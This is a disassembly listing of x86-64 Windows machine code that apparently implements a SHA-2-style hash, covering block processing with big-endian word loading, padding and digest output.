   140008ea5:	4c 89 ac 24 68 01 00 	mov    %r13,0x168(%rsp)
   140008eac:	00 
   140008ead:	48 8d 84 24 b0 00 00 	lea    0xb0(%rsp),%rax
   140008eb4:	00 
   140008eb5:	48 2b c3             	sub    %rbx,%rax
   140008eb8:	4c 89 b4 24 28 01 00 	mov    %r14,0x128(%rsp)
   140008ebf:	00 
   140008ec0:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140008ec5:	4c 8d b4 24 98 00 00 	lea    0x98(%rsp),%r14
   140008ecc:	00 
   140008ecd:	48 8d 84 24 b4 00 00 	lea    0xb4(%rsp),%rax
   140008ed4:	00 
   140008ed5:	4c 89 bc 24 20 01 00 	mov    %r15,0x120(%rsp)
   140008edc:	00 
   140008edd:	48 2b c3             	sub    %rbx,%rax
   140008ee0:	4c 8d bc 24 9c 00 00 	lea    0x9c(%rsp),%r15
   140008ee7:	00 
   140008ee8:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140008eed:	4c 8d ac 24 a4 00 00 	lea    0xa4(%rsp),%r13
   140008ef4:	00 
   140008ef5:	48 8d 84 24 b8 00 00 	lea    0xb8(%rsp),%rax
   140008efc:	00 
   140008efd:	4c 2b f3             	sub    %rbx,%r14
   140008f00:	48 2b c3             	sub    %rbx,%rax
   140008f03:	4c 8d 9c 24 a8 00 00 	lea    0xa8(%rsp),%r11
   140008f0a:	00 
   140008f0b:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140008f10:	48 8d 6b 58          	lea    0x58(%rbx),%rbp
   140008f14:	4c 2b db             	sub    %rbx,%r11
   140008f17:	48 8d 84 24 bc 00 00 	lea    0xbc(%rsp),%rax
   140008f1e:	00 
   140008f1f:	48 2b c3             	sub    %rbx,%rax
   140008f22:	4c 89 9c 24 88 00 00 	mov    %r11,0x88(%rsp)
   140008f29:	00 
   140008f2a:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140008f2f:	4c 2b fb             	sub    %rbx,%r15
   140008f32:	48 8d 84 24 c0 00 00 	lea    0xc0(%rsp),%rax
   140008f39:	00 
   140008f3a:	4c 2b e3             	sub    %rbx,%r12
   140008f3d:	48 2b c3             	sub    %rbx,%rax
   140008f40:	4c 2b eb             	sub    %rbx,%r13
   140008f43:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140008f48:	48 8d 84 24 c4 00 00 	lea    0xc4(%rsp),%rax
   140008f4f:	00 
   140008f50:	48 2b c3             	sub    %rbx,%rax
   140008f53:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140008f58:	48 8d 84 24 c8 00 00 	lea    0xc8(%rsp),%rax
   140008f5f:	00 
   140008f60:	48 2b c3             	sub    %rbx,%rax
   140008f63:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140008f68:	48 8d 84 24 cc 00 00 	lea    0xcc(%rsp),%rax
   140008f6f:	00 
   140008f70:	48 2b c3             	sub    %rbx,%rax
   140008f73:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140008f78:	48 8d 84 24 90 00 00 	lea    0x90(%rsp),%rax
   140008f7f:	00 
   140008f80:	48 2b c3             	sub    %rbx,%rax
   140008f83:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140008f88:	48 8d 84 24 94 00 00 	lea    0x94(%rsp),%rax
   140008f8f:	00 
   140008f90:	48 2b c3             	sub    %rbx,%rax
   140008f93:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140008f98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140008f9f:	00 
   140008fa0:	b8 80 00 00 00       	mov    $0x80,%eax
   140008fa5:	4c 63 c9             	movslq %ecx,%r9
   140008fa8:	2b c1                	sub    %ecx,%eax
   140008faa:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   140008faf:	4c 63 c0             	movslq %eax,%r8
   140008fb2:	4c 03 cb             	add    %rbx,%r9
   140008fb5:	48 63 44 24 20       	movslq 0x20(%rsp),%rax
   140008fba:	49 3b c0             	cmp    %r8,%rax
   140008fbd:	73 28                	jae    0x140008fe7
   140008fbf:	90                   	nop
   140008fc0:	48 63 44 24 20       	movslq 0x20(%rsp),%rax
   140008fc5:	48 63 4c 24 20       	movslq 0x20(%rsp),%rcx
   140008fca:	0f b6 04 38          	movzbl (%rax,%rdi,1),%eax
   140008fce:	42 88 44 09 40       	mov    %al,0x40(%rcx,%r9,1)
   140008fd3:	8b 44 24 20          	mov    0x20(%rsp),%eax
   140008fd7:	ff c0                	inc    %eax
   140008fd9:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140008fdd:	48 63 44 24 20       	movslq 0x20(%rsp),%rax
   140008fe2:	49 3b c0             	cmp    %r8,%rax
   140008fe5:	72 d9                	jb     0x140008fc0
   140008fe7:	8b 8b c0 00 00 00    	mov    0xc0(%rbx),%ecx
   140008fed:	b8 80 00 00 00       	mov    $0x80,%eax
   140008ff2:	2b c1                	sub    %ecx,%eax
   140008ff4:	83 c6 80             	add    $0xffffff80,%esi
   140008ff7:	48 98                	cltq
   140008ff9:	4d 8b c2             	mov    %r10,%r8
   140008ffc:	48 03 f8             	add    %rax,%rdi
   140008fff:	4c 8b cb             	mov    %rbx,%r9
   140009002:	03 f1                	add    %ecx,%esi
   140009004:	48 89 bc 24 80 00 00 	mov    %rdi,0x80(%rsp)
   14000900b:	00 
   14000900c:	48 8b 7c 24 28       	mov    0x28(%rsp),%rdi
   140009011:	4c 8b d5             	mov    %rbp,%r10
   140009014:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140009018:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   14000901d:	0f 1f 00             	nopl   (%rax)
   140009020:	41 0f b6 41 41       	movzbl 0x41(%r9),%eax
   140009025:	49 8d 14 28          	lea    (%r8,%rbp,1),%rdx
   140009029:	0f b6 4a e8          	movzbl -0x18(%rdx),%ecx
   14000902d:	c1 e1 08             	shl    $0x8,%ecx
   140009030:	0b c8                	or     %eax,%ecx
   140009032:	41 0f b6 44 18 42    	movzbl 0x42(%r8,%rbx,1),%eax
   140009038:	c1 e1 08             	shl    $0x8,%ecx
   14000903b:	0b c8                	or     %eax,%ecx
   14000903d:	41 0f b6 44 18 43    	movzbl 0x43(%r8,%rbx,1),%eax
   140009043:	c1 e1 08             	shl    $0x8,%ecx
   140009046:	0b c8                	or     %eax,%ecx
   140009048:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   14000904d:	42 89 4c 10 a8       	mov    %ecx,-0x58(%rax,%r10,1)
   140009052:	41 0f b6 44 18 45    	movzbl 0x45(%r8,%rbx,1),%eax
   140009058:	41 0f b6 4c 18 44    	movzbl 0x44(%r8,%rbx,1),%ecx
   14000905e:	c1 e1 08             	shl    $0x8,%ecx
   140009061:	0b c8                	or     %eax,%ecx
   140009063:	41 0f b6 44 18 46    	movzbl 0x46(%r8,%rbx,1),%eax
   140009069:	c1 e1 08             	shl    $0x8,%ecx
   14000906c:	0b c8                	or     %eax,%ecx
   14000906e:	41 0f b6 44 18 47    	movzbl 0x47(%r8,%rbx,1),%eax
   140009074:	c1 e1 08             	shl    $0x8,%ecx
   140009077:	0b c8                	or     %eax,%ecx
   140009079:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000907e:	89 4c 02 a8          	mov    %ecx,-0x58(%rdx,%rax,1)
   140009082:	41 0f b6 44 18 49    	movzbl 0x49(%r8,%rbx,1),%eax
   140009088:	41 0f b6 4c 18 48    	movzbl 0x48(%r8,%rbx,1),%ecx
   14000908e:	c1 e1 08             	shl    $0x8,%ecx
   140009091:	0b c8                	or     %eax,%ecx
   140009093:	41 0f b6 44 18 4a    	movzbl 0x4a(%r8,%rbx,1),%eax
   140009099:	c1 e1 08             	shl    $0x8,%ecx
   14000909c:	0b c8                	or     %eax,%ecx
   14000909e:	41 0f b6 44 18 4b    	movzbl 0x4b(%r8,%rbx,1),%eax
   1400090a4:	c1 e1 08             	shl    $0x8,%ecx
   1400090a7:	0b c8                	or     %eax,%ecx
   1400090a9:	41 0f b6 44 18 4d    	movzbl 0x4d(%r8,%rbx,1),%eax
   1400090af:	42 89 4c 32 a8       	mov    %ecx,-0x58(%rdx,%r14,1)
   1400090b4:	41 0f b6 4c 18 4c    	movzbl 0x4c(%r8,%rbx,1),%ecx
   1400090ba:	c1 e1 08             	shl    $0x8,%ecx
   1400090bd:	0b c8                	or     %eax,%ecx
   1400090bf:	41 0f b6 44 18 4e    	movzbl 0x4e(%r8,%rbx,1),%eax
   1400090c5:	c1 e1 08             	shl    $0x8,%ecx
   1400090c8:	0b c8                	or     %eax,%ecx
   1400090ca:	41 0f b6 44 18 4f    	movzbl 0x4f(%r8,%rbx,1),%eax
   1400090d0:	c1 e1 08             	shl    $0x8,%ecx
   1400090d3:	0b c8                	or     %eax,%ecx
   1400090d5:	41 0f b6 44 18 51    	movzbl 0x51(%r8,%rbx,1),%eax
   1400090db:	42 89 4c 3a a8       	mov    %ecx,-0x58(%rdx,%r15,1)
   1400090e0:	0f b6 4a f8          	movzbl -0x8(%rdx),%ecx
   1400090e4:	c1 e1 08             	shl    $0x8,%ecx
   1400090e7:	0b c8                	or     %eax,%ecx
   1400090e9:	41 0f b6 44 18 52    	movzbl 0x52(%r8,%rbx,1),%eax
   1400090ef:	c1 e1 08             	shl    $0x8,%ecx
   1400090f2:	0b c8                	or     %eax,%ecx
   1400090f4:	41 0f b6 44 18 53    	movzbl 0x53(%r8,%rbx,1),%eax
   1400090fa:	c1 e1 08             	shl    $0x8,%ecx
   1400090fd:	0b c8                	or     %eax,%ecx
   1400090ff:	41 0f b6 44 18 55    	movzbl 0x55(%r8,%rbx,1),%eax
   140009105:	42 89 4c 22 a8       	mov    %ecx,-0x58(%rdx,%r12,1)
   14000910a:	41 0f b6 4c 18 54    	movzbl 0x54(%r8,%rbx,1),%ecx
   140009110:	c1 e1 08             	shl    $0x8,%ecx
   140009113:	0b c8                	or     %eax,%ecx
   140009115:	41 0f b6 44 18 56    	movzbl 0x56(%r8,%rbx,1),%eax
   14000911b:	c1 e1 08             	shl    $0x8,%ecx
   14000911e:	0b c8                	or     %eax,%ecx
   140009120:	41 0f b6 44 18 57    	movzbl 0x57(%r8,%rbx,1),%eax
   140009126:	c1 e1 08             	shl    $0x8,%ecx
   140009129:	0b c8                	or     %eax,%ecx
   14000912b:	0f b6 02             	movzbl (%rdx),%eax
   14000912e:	42 89 4c 2a a8       	mov    %ecx,-0x58(%rdx,%r13,1)
   140009133:	41 0f b6 4c 18 59    	movzbl 0x59(%r8,%rbx,1),%ecx
   140009139:	c1 e0 08             	shl    $0x8,%eax
   14000913c:	0b c8                	or     %eax,%ecx
   14000913e:	41 0f b6 44 18 5a    	movzbl 0x5a(%r8,%rbx,1),%eax
   140009144:	c1 e1 08             	shl    $0x8,%ecx
   140009147:	0b c8                	or     %eax,%ecx
   140009149:	41 0f b6 44 18 5b    	movzbl 0x5b(%r8,%rbx,1),%eax
   14000914f:	c1 e1 08             	shl    $0x8,%ecx
   140009152:	0b c8                	or     %eax,%ecx
   140009154:	42 89 4c 1a a8       	mov    %ecx,-0x58(%rdx,%r11,1)
   140009159:	41 0f b6 4c 18 5c    	movzbl 0x5c(%r8,%rbx,1),%ecx
   14000915f:	c1 e1 08             	shl    $0x8,%ecx
   140009162:	41 0f b6 44 18 5d    	movzbl 0x5d(%r8,%rbx,1),%eax
   140009168:	0b c8                	or     %eax,%ecx
   14000916a:	41 0f b6 44 18 5e    	movzbl 0x5e(%r8,%rbx,1),%eax
   140009170:	c1 e1 08             	shl    $0x8,%ecx
   140009173:	0b c8                	or     %eax,%ecx
   140009175:	41 0f b6 44 18 5f    	movzbl 0x5f(%r8,%rbx,1),%eax
   14000917b:	c1 e1 08             	shl    $0x8,%ecx
   14000917e:	0b c8                	or     %eax,%ecx
   140009180:	41 0f b6 44 18 61    	movzbl 0x61(%r8,%rbx,1),%eax
   140009186:	89 4c 3a a8          	mov    %ecx,-0x58(%rdx,%rdi,1)
   14000918a:	0f b6 4a 08          	movzbl 0x8(%rdx),%ecx
   14000918e:	c1 e1 08             	shl    $0x8,%ecx
   140009191:	0b c8                	or     %eax,%ecx
   140009193:	41 0f b6 44 18 62    	movzbl 0x62(%r8,%rbx,1),%eax
   140009199:	c1 e1 08             	shl    $0x8,%ecx
   14000919c:	0b c8                	or     %eax,%ecx
   14000919e:	41 0f b6 44 18 63    	movzbl 0x63(%r8,%rbx,1),%eax
   1400091a4:	c1 e1 08             	shl    $0x8,%ecx
   1400091a7:	0b c8                	or     %eax,%ecx
   1400091a9:	41 0f b6 44 18 65    	movzbl 0x65(%r8,%rbx,1),%eax
   1400091af:	89 4c 32 a8          	mov    %ecx,-0x58(%rdx,%rsi,1)
   1400091b3:	41 0f b6 4c 18 64    	movzbl 0x64(%r8,%rbx,1),%ecx
   1400091b9:	c1 e1 08             	shl    $0x8,%ecx
   1400091bc:	0b c8                	or     %eax,%ecx
   1400091be:	41 0f b6 44 18 66    	movzbl 0x66(%r8,%rbx,1),%eax
   1400091c4:	c1 e1 08             	shl    $0x8,%ecx
   1400091c7:	0b c8                	or     %eax,%ecx
   1400091c9:	41 0f b6 44 18 67    	movzbl 0x67(%r8,%rbx,1),%eax
   1400091cf:	c1 e1 08             	shl    $0x8,%ecx
   1400091d2:	0b c8                	or     %eax,%ecx
   1400091d4:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   1400091d9:	89 4c 02 a8          	mov    %ecx,-0x58(%rdx,%rax,1)
   1400091dd:	41 0f b6 44 18 69    	movzbl 0x69(%r8,%rbx,1),%eax
   1400091e3:	0f b6 4a 10          	movzbl 0x10(%rdx),%ecx
   1400091e7:	c1 e1 08             	shl    $0x8,%ecx
   1400091ea:	0b c8                	or     %eax,%ecx
   1400091ec:	41 0f b6 44 18 6a    	movzbl 0x6a(%r8,%rbx,1),%eax
   1400091f2:	c1 e1 08             	shl    $0x8,%ecx
   1400091f5:	0b c8                	or     %eax,%ecx
   1400091f7:	41 0f b6 44 18 6b    	movzbl 0x6b(%r8,%rbx,1),%eax
   1400091fd:	c1 e1 08             	shl    $0x8,%ecx
   140009200:	0b c8                	or     %eax,%ecx
   140009202:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140009207:	89 4c 02 a8          	mov    %ecx,-0x58(%rdx,%rax,1)
   14000920b:	41 0f b6 44 18 6d    	movzbl 0x6d(%r8,%rbx,1),%eax
   140009211:	41 0f b6 4c 18 6c    	movzbl 0x6c(%r8,%rbx,1),%ecx
   140009217:	c1 e1 08             	shl    $0x8,%ecx
   14000921a:	0b c8                	or     %eax,%ecx
   14000921c:	41 0f b6 44 18 6e    	movzbl 0x6e(%r8,%rbx,1),%eax
   140009222:	c1 e1 08             	shl    $0x8,%ecx
   140009225:	0b c8                	or     %eax,%ecx
   140009227:	41 0f b6 44 18 6f    	movzbl 0x6f(%r8,%rbx,1),%eax
   14000922d:	c1 e1 08             	shl    $0x8,%ecx
   140009230:	0b c8                	or     %eax,%ecx
   140009232:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140009237:	89 4c 02 a8          	mov    %ecx,-0x58(%rdx,%rax,1)
   14000923b:	41 0f b6 44 18 71    	movzbl 0x71(%r8,%rbx,1),%eax
   140009241:	0f b6 4a 18          	movzbl 0x18(%rdx),%ecx
   140009245:	c1 e1 08             	shl    $0x8,%ecx
   140009248:	0b c8                	or     %eax,%ecx
   14000924a:	41 0f b6 44 18 72    	movzbl 0x72(%r8,%rbx,1),%eax
   140009250:	c1 e1 08             	shl    $0x8,%ecx
   140009253:	0b c8                	or     %eax,%ecx
   140009255:	41 0f b6 44 18 73    	movzbl 0x73(%r8,%rbx,1),%eax
   14000925b:	c1 e1 08             	shl    $0x8,%ecx
   14000925e:	0b c8                	or     %eax,%ecx
   140009260:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140009265:	89 4c 02 a8          	mov    %ecx,-0x58(%rdx,%rax,1)
   140009269:	41 0f b6 44 18 75    	movzbl 0x75(%r8,%rbx,1),%eax
   14000926f:	41 0f b6 4c 18 74    	movzbl 0x74(%r8,%rbx,1),%ecx
   140009275:	c1 e1 08             	shl    $0x8,%ecx
   140009278:	0b c8                	or     %eax,%ecx
   14000927a:	41 0f b6 44 18 76    	movzbl 0x76(%r8,%rbx,1),%eax
   140009280:	c1 e1 08             	shl    $0x8,%ecx
   140009283:	0b c8                	or     %eax,%ecx
   140009285:	41 0f b6 44 18 77    	movzbl 0x77(%r8,%rbx,1),%eax
   14000928b:	c1 e1 08             	shl    $0x8,%ecx
   14000928e:	0b c8                	or     %eax,%ecx
   140009290:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140009295:	89 4c 02 a8          	mov    %ecx,-0x58(%rdx,%rax,1)
   140009299:	41 0f b6 44 18 79    	movzbl 0x79(%r8,%rbx,1),%eax
   14000929f:	4d 8d 49 40          	lea    0x40(%r9),%r9
   1400092a3:	0f b6 4a 20          	movzbl 0x20(%rdx),%ecx
   1400092a7:	4d 8d 52 40          	lea    0x40(%r10),%r10
   1400092ab:	c1 e1 08             	shl    $0x8,%ecx
   1400092ae:	0b c8                	or     %eax,%ecx
   1400092b0:	41 0f b6 44 18 7a    	movzbl 0x7a(%r8,%rbx,1),%eax
   1400092b6:	c1 e1 08             	shl    $0x8,%ecx
   1400092b9:	0b c8                	or     %eax,%ecx
   1400092bb:	41 0f b6 44 18 7b    	movzbl 0x7b(%r8,%rbx,1),%eax
   1400092c1:	c1 e1 08             	shl    $0x8,%ecx
   1400092c4:	0b c8                	or     %eax,%ecx
   1400092c6:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400092cb:	89 4c 02 a8          	mov    %ecx,-0x58(%rdx,%rax,1)
   1400092cf:	41 0f b6 44 18 7d    	movzbl 0x7d(%r8,%rbx,1),%eax
   1400092d5:	41 0f b6 4c 18 7c    	movzbl 0x7c(%r8,%rbx,1),%ecx
   1400092db:	c1 e1 08             	shl    $0x8,%ecx
   1400092de:	0b c8                	or     %eax,%ecx
   1400092e0:	41 0f b6 44 18 7e    	movzbl 0x7e(%r8,%rbx,1),%eax
   1400092e6:	c1 e1 08             	shl    $0x8,%ecx
   1400092e9:	0b c8                	or     %eax,%ecx
   1400092eb:	41 0f b6 44 18 7f    	movzbl 0x7f(%r8,%rbx,1),%eax
   1400092f1:	c1 e1 08             	shl    $0x8,%ecx
   1400092f4:	49 83 c0 40          	add    $0x40,%r8
   1400092f8:	0b c8                	or     %eax,%ecx
   1400092fa:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   1400092ff:	89 4c 02 a8          	mov    %ecx,-0x58(%rdx,%rax,1)
   140009303:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000930a:	0f 8c 10 fd ff ff    	jl     0x140009020
   140009310:	48 8d 94 24 90 00 00 	lea    0x90(%rsp),%rdx
   140009317:	00 
   140009318:	48 8b cb             	mov    %rbx,%rcx
   14000931b:	e8 f0 e4 ff ff       	call   0x140007810
   140009320:	8b 74 24 20          	mov    0x20(%rsp),%esi
   140009324:	45 33 d2             	xor    %r10d,%r10d
   140009327:	48 8b bc 24 80 00 00 	mov    0x80(%rsp),%rdi
   14000932e:	00 
   14000932f:	41 8b ca             	mov    %r10d,%ecx
   140009332:	4c 8b 9c 24 88 00 00 	mov    0x88(%rsp),%r11
   140009339:	00 
   14000933a:	44 89 93 c0 00 00 00 	mov    %r10d,0xc0(%rbx)
   140009341:	81 fe 80 00 00 00    	cmp    $0x80,%esi
   140009347:	0f 8d 53 fc ff ff    	jge    0x140008fa0
   14000934d:	4c 8b bc 24 20 01 00 	mov    0x120(%rsp),%r15
   140009354:	00 
   140009355:	4c 8b b4 24 28 01 00 	mov    0x128(%rsp),%r14
   14000935c:	00 
   14000935d:	4c 8b ac 24 68 01 00 	mov    0x168(%rsp),%r13
   140009364:	00 
   140009365:	4c 8b a4 24 60 01 00 	mov    0x160(%rsp),%r12
   14000936c:	00 
   14000936d:	48 8b ac 24 58 01 00 	mov    0x158(%rsp),%rbp
   140009374:	00 
   140009375:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   14000937a:	48 63 44 24 20       	movslq 0x20(%rsp),%rax
   14000937f:	4c 63 c6             	movslq %esi,%r8
   140009382:	49 3b c0             	cmp    %r8,%rax
   140009385:	73 2f                	jae    0x1400093b6
   140009387:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000938e:	00 00 
   140009390:	48 63 44 24 20       	movslq 0x20(%rsp),%rax
   140009395:	48 63 4c 24 20       	movslq 0x20(%rsp),%rcx
   14000939a:	0f b6 04 38          	movzbl (%rax,%rdi,1),%eax
   14000939e:	88 44 19 40          	mov    %al,0x40(%rcx,%rbx,1)
   1400093a2:	8b 44 24 20          	mov    0x20(%rsp),%eax
   1400093a6:	ff c0                	inc    %eax
   1400093a8:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400093ac:	48 63 44 24 20       	movslq 0x20(%rsp),%rax
   1400093b1:	49 3b c0             	cmp    %r8,%rax
   1400093b4:	72 da                	jb     0x140009390
   1400093b6:	89 b3 c0 00 00 00    	mov    %esi,0xc0(%rbx)
   1400093bc:	48 8b 8c 24 10 01 00 	mov    0x110(%rsp),%rcx
   1400093c3:	00 
   1400093c4:	48 33 cc             	xor    %rsp,%rcx
   1400093c7:	e8 14 06 00 00       	call   0x1400099e0
   1400093cc:	48 81 c4 30 01 00 00 	add    $0x130,%rsp
   1400093d3:	5f                   	pop    %rdi
   1400093d4:	5e                   	pop    %rsi
   1400093d5:	5b                   	pop    %rbx
   1400093d6:	c3                   	ret
   1400093d7:	cc                   	int3
   1400093d8:	cc                   	int3
   1400093d9:	cc                   	int3
   1400093da:	cc                   	int3
   1400093db:	cc                   	int3
   1400093dc:	cc                   	int3
   1400093dd:	cc                   	int3
   1400093de:	cc                   	int3
   1400093df:	cc                   	int3
   1400093e0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400093e5:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400093ea:	55                   	push   %rbp
   1400093eb:	57                   	push   %rdi
   1400093ec:	41 54                	push   %r12
   1400093ee:	41 56                	push   %r14
   1400093f0:	41 57                	push   %r15
   1400093f2:	48 8d 6c 24 c9       	lea    -0x37(%rsp),%rbp
   1400093f7:	48 81 ec d0 00 00 00 	sub    $0xd0,%rsp
   1400093fe:	48 8b 05 fb 1b 00 00 	mov    0x1bfb(%rip),%rax        # 0x14000b000
   140009405:	48 33 c4             	xor    %rsp,%rax
   140009408:	48 89 45 27          	mov    %rax,0x27(%rbp)
   14000940c:	44 8b 81 c0 00 00 00 	mov    0xc0(%rcx),%r8d
   140009413:	48 8b d9             	mov    %rcx,%rbx
   140009416:	b8 70 00 00 00       	mov    $0x70,%eax
   14000941b:	4c 8b fa             	mov    %rdx,%r15
   14000941e:	41 2b c0             	sub    %r8d,%eax
   140009421:	41 b9 f0 00 00 00    	mov    $0xf0,%r9d
   140009427:	45 2b c8             	sub    %r8d,%r9d
   14000942a:	8b 93 c8 00 00 00    	mov    0xc8(%rbx),%edx
   140009430:	41 83 f8 70          	cmp    $0x70,%r8d
   140009434:	8b f2                	mov    %edx,%esi
   140009436:	44 0f 4c c8          	cmovl  %eax,%r9d
   14000943a:	8b 81 d0 00 00 00    	mov    0xd0(%rcx),%eax
   140009440:	8b 89 cc 00 00 00    	mov    0xcc(%rcx),%ecx
   140009446:	8b f9                	mov    %ecx,%edi
   140009448:	c1 ef 1d             	shr    $0x1d,%edi
   14000944b:	c1 ee 1d             	shr    $0x1d,%esi
   14000944e:	8d 04 c5 00 00 00 00 	lea    0x0(,%rax,8),%eax
   140009455:	0b f8                	or     %eax,%edi
   140009457:	8d 04 cd 00 00 00 00 	lea    0x0(,%rcx,8),%eax
   14000945e:	8b 8b c4 00 00 00    	mov    0xc4(%rbx),%ecx
   140009464:	0b f0                	or     %eax,%esi
   140009466:	8d 04 d5 00 00 00 00 	lea    0x0(,%rdx,8),%eax
   14000946d:	c7 45 87 00 00 00 00 	movl   $0x0,-0x79(%rbp)
   140009474:	44 8b f1             	mov    %ecx,%r14d
   140009477:	49 63 d1             	movslq %r9d,%rdx
   14000947a:	41 c1 ee 1d          	shr    $0x1d,%r14d
   14000947e:	44 0b f0             	or     %eax,%r14d
   140009481:	89 7d 9b             	mov    %edi,-0x65(%rbp)
   140009484:	48 63 45 87          	movslq -0x79(%rbp),%rax
   140009488:	44 8d 24 cd 00 00 00 	lea    0x0(,%rcx,8),%r12d
   14000948f:	00 
   140009490:	89 75 97             	mov    %esi,-0x69(%rbp)
   140009493:	44 89 75 93          	mov    %r14d,-0x6d(%rbp)
   140009497:	44 89 65 8f          	mov    %r12d,-0x71(%rbp)
   14000949b:	48 3b c2             	cmp    %rdx,%rax
   14000949e:	73 1a                	jae    0x1400094ba
   1400094a0:	48 63 45 87          	movslq -0x79(%rbp),%rax
   1400094a4:	c6 44 05 a7 00       	movb   $0x0,-0x59(%rbp,%rax,1)
   1400094a9:	8b 45 87             	mov    -0x79(%rbp),%eax
   1400094ac:	ff c0                	inc    %eax
   1400094ae:	89 45 87             	mov    %eax,-0x79(%rbp)
   1400094b1:	48 63 45 87          	movslq -0x79(%rbp),%rax
   1400094b5:	48 3b c2             	cmp    %rdx,%rax
   1400094b8:	72 e6                	jb     0x1400094a0
   1400094ba:	45 8b c1             	mov    %r9d,%r8d
   1400094bd:	c6 45 a7 80          	movb   $0x80,-0x59(%rbp)
   1400094c1:	48 8d 55 a7          	lea    -0x59(%rbp),%rdx
   1400094c5:	48 8b cb             	mov    %rbx,%rcx
   1400094c8:	e8 e3 f8 ff ff       	call   0x140008db0
   1400094cd:	0f b6 45 9e          	movzbl -0x62(%rbp),%eax
   1400094d1:	48 8d 55 a7          	lea    -0x59(%rbp),%rdx
   1400094d5:	88 45 a7             	mov    %al,-0x59(%rbp)
   1400094d8:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   1400094de:	0f b6 45 9d          	movzbl -0x63(%rbp),%eax
   1400094e2:	48 8b cb             	mov    %rbx,%rcx
   1400094e5:	88 45 a8             	mov    %al,-0x58(%rbp)
   1400094e8:	0f b6 45 9c          	movzbl -0x64(%rbp),%eax
   1400094ec:	88 45 a9             	mov    %al,-0x57(%rbp)
   1400094ef:	0f b6 45 9a          	movzbl -0x66(%rbp),%eax
   1400094f3:	88 45 ab             	mov    %al,-0x55(%rbp)
   1400094f6:	0f b6 45 99          	movzbl -0x67(%rbp),%eax
   1400094fa:	88 45 ac             	mov    %al,-0x54(%rbp)
   1400094fd:	0f b6 45 98          	movzbl -0x68(%rbp),%eax
   140009501:	88 45 ad             	mov    %al,-0x53(%rbp)
   140009504:	0f b6 45 96          	movzbl -0x6a(%rbp),%eax
   140009508:	88 45 af             	mov    %al,-0x51(%rbp)
   14000950b:	0f b6 45 95          	movzbl -0x6b(%rbp),%eax
   14000950f:	88 45 b0             	mov    %al,-0x50(%rbp)
   140009512:	0f b6 45 94          	movzbl -0x6c(%rbp),%eax
   140009516:	88 45 b1             	mov    %al,-0x4f(%rbp)
   140009519:	0f b6 45 92          	movzbl -0x6e(%rbp),%eax
   14000951d:	88 45 b3             	mov    %al,-0x4d(%rbp)
   140009520:	0f b6 45 91          	movzbl -0x6f(%rbp),%eax
   140009524:	88 45 b4             	mov    %al,-0x4c(%rbp)
   140009527:	0f b6 45 90          	movzbl -0x70(%rbp),%eax
   14000952b:	88 45 b5             	mov    %al,-0x4b(%rbp)
   14000952e:	40 88 7d aa          	mov    %dil,-0x56(%rbp)
   140009532:	40 88 75 ae          	mov    %sil,-0x52(%rbp)
   140009536:	44 88 75 b2          	mov    %r14b,-0x4e(%rbp)
   14000953a:	44 88 65 b6          	mov    %r12b,-0x4a(%rbp)
   14000953e:	e8 6d f8 ff ff       	call   0x140008db0
   140009543:	8b 0b                	mov    (%rbx),%ecx
   140009545:	8b c1                	mov    %ecx,%eax
   140009547:	8b 53 04             	mov    0x4(%rbx),%edx
   14000954a:	c1 e8 18             	shr    $0x18,%eax
   14000954d:	41 88 07             	mov    %al,(%r15)
   140009550:	8b c1                	mov    %ecx,%eax
   140009552:	c1 e8 10             	shr    $0x10,%eax
   140009555:	41 88 47 01          	mov    %al,0x1(%r15)
   140009559:	8b c1                	mov    %ecx,%eax
   14000955b:	c1 e8 08             	shr    $0x8,%eax
   14000955e:	41 88 47 02          	mov    %al,0x2(%r15)
   140009562:	8b c2                	mov    %edx,%eax
   140009564:	c1 e8 18             	shr    $0x18,%eax
   140009567:	41 88 47 04          	mov    %al,0x4(%r15)
   14000956b:	8b c2                	mov    %edx,%eax
   14000956d:	c1 e8 10             	shr    $0x10,%eax
   140009570:	41 88 47 05          	mov    %al,0x5(%r15)
   140009574:	8b c2                	mov    %edx,%eax
   140009576:	c1 e8 08             	shr    $0x8,%eax
   140009579:	41 88 47 06          	mov    %al,0x6(%r15)
   14000957d:	41 88 4f 03          	mov    %cl,0x3(%r15)
   140009581:	41 88 57 07          	mov    %dl,0x7(%r15)
   140009585:	8b 4b 08             	mov    0x8(%rbx),%ecx
   140009588:	8b c1                	mov    %ecx,%eax
   14000958a:	8b 53 0c             	mov    0xc(%rbx),%edx
   14000958d:	c1 e8 18             	shr    $0x18,%eax
   140009590:	41 88 47 08          	mov    %al,0x8(%r15)
   140009594:	8b c1                	mov    %ecx,%eax
   140009596:	c1 e8 10             	shr    $0x10,%eax
   140009599:	41 88 47 09          	mov    %al,0x9(%r15)
   14000959d:	8b c1                	mov    %ecx,%eax
   14000959f:	c1 e8 08             	shr    $0x8,%eax
   1400095a2:	41 88 47 0a          	mov    %al,0xa(%r15)
